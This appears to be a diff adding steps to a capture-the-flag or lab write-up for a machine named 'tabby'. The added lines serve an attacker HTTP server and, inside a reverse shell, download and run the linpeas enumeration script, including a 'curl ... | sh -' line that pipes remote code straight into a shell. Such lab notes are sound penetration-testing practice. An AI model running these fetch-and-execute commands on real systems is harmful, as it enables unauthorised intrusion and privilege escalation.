@@ -253,4 +253,20 @@ curl tabby:8080/shell/filesystem > filesystem
 netstat -nao
 # maybe we can run lipeas...
 ```
+
+```sh
+# kali:
+cd /opt
+python3 -m http.server 80
+```
+
+```sh
+# in the reverse shell:
+wget 10.10.14.69/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh -a | tee linpeas.log
+
+# alternatively, don't save it:
+curl 10.10.14.69 | sh -
+```
 ```
